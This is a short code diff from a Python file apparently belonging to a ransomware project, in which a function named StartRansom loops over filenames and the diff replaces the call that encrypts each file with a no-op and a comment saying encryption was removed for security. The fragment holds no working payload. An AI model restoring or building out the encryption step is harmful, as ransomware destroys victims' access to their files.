@@ -121,7 +121,8 @@ def StartRansom():
             while line:
                 filename = line.strip()
                 try:
-                    ransom0.Encrypt(filename)
+                    pass
+                    # removed encryption for security purposes
                 except Exception:
                     print("!Permission denied")
                 line = fp.readline()
